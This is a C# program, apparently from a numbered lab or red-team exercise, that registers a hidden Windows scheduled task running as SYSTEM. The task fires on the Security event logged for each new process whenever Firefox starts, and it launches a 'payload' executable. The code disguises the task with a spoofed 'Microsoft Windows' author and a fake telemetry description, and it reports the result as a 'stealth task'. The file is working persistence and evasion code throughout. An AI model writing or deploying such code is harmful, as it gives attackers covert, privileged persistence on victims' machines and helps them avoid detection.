using System;
using System.IO;
using System.Runtime.InteropServices;

namespace A06_3b_event_trigger_schtask_persist
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                // --- DEBUG BLOCK 1: Validate Payload File Existence via Native IO ---
                string payloadPath = @"C:\Users\Public\A06_3b_SampleApp.exe";
                Console.WriteLine($"[*] Debug: Checking payload path: '{payloadPath}'...");
                if (!File.Exists(payloadPath))
                {
                    Console.WriteLine($"[-] PRE-REGISTRATION ERROR: Target payload binary was not found at '{payloadPath}'.");
                    Console.WriteLine("    Ensure your A06_3b_SampleApp project is compiled and copied to this path before registering.");
                    return;
                }
                Console.WriteLine("[+] Debug: Payload path verification successful.");

                // --- DEBUG BLOCK 2: Check for Windows Event Log Access ---
                // We verify that the directory containing the Security event log files can be verified
                // as an alternative to using the Eventing.Reader objects.
                string systemEventLogPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"LogFiles");
                Console.WriteLine("[*] Debug: Probing platform registration compatibility...");

                // --- STANDARD REGISTRATION BLOCK ---
#pragma warning disable CA1416
                Type? taskSchedulerType = Type.GetTypeFromProgID("Schedule.Service");
#pragma warning restore CA1416
                if (taskSchedulerType == null)
                {
                    Console.WriteLine("[-] Could not find Schedule.Service COM object.");
                    return;
                }

                dynamic? ts = Activator.CreateInstance(taskSchedulerType);
                if (ts == null)
                {
                    Console.WriteLine("[-] Could not instantiate TaskScheduler instance.");
                    return;
                }
                ts.Connect();

                dynamic rootFolder = ts.GetFolder("\\");

                try
                {
                    rootFolder.DeleteTask("A06_3b_EventTriggerTask", 0);
                }
                catch (COMException) { /* Task didn't exist, ignore */ }

                dynamic taskDef = ts.NewTask(0);

                dynamic regInfo = taskDef.RegistrationInfo;
                regInfo.Author = "Microsoft Windows";
                regInfo.Description = "Telemetry Sync Client Core";

                dynamic triggers = taskDef.Triggers;
                dynamic trigger = triggers.Create(0); // TASK_TRIGGER_EVENT = 0

                // XPath Subscription: Selects Security Event ID 4688 where the Process Name contains 'firefox.exe'
                string subscriptionXml =
                    "<QueryList>" +
                    "  <Query Id='0' Path='Security'>" +
                    "    <Select Path='Security'>" +
                    "        *[System[EventID=4688]] and *[EventData[Data[@Name='NewProcessName'] and (contains(., '\\firefox.exe'))]]" +
                    "    </Select>" +
                    "  </Query>" +
                    "</QueryList>";

                trigger.Id = "FirefoxLaunchTrigger";
                trigger.Subscription = subscriptionXml;
                trigger.Enabled = true;

                dynamic actions = taskDef.Actions;
                dynamic action = actions.Create(0); // TASK_ACTION_EXEC = 0

                action.Path = payloadPath;

                dynamic settings = taskDef.Settings;
                settings.DisallowStartIfOnBatteries = false;
                settings.StopIfGoingOnBatteries = false;
                settings.Hidden = true;

                Console.WriteLine("[*] Debug: Invoking RegisterTaskDefinition via COM interface...");
                dynamic registeredTask = rootFolder.RegisterTaskDefinition(
                    "A06_3b_EventTriggerTask",
                    taskDef,
                    6,                             // TASK_CREATE_OR_UPDATE
                    "SYSTEM",
                    Type.Missing,
                    5,                             // TASK_LOGON_SERVICE_ACCOUNT
                    Type.Missing
                );

                Console.WriteLine("[+] Successfully registered C# application-triggered stealth task!");
            }
            catch (COMException ex)
            {
                Console.WriteLine($"[-] COM Error registering task: {ex.Message} (HRESULT: 0x{ex.HResult:X8})");
                if (ex.HResult == unchecked((int)0x80070002))
                {
                    Console.WriteLine("[*] Diagnosis: The Task Scheduler engine rejected a specific parameter path.");
                    Console.WriteLine("    Ensure that your payload exists at the specified target destination and that");
                    Console.WriteLine("    the Audit Policy on your machine allows monitoring of Event 4688.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error registering task: {ex.Message}");
            }
        }
    }
}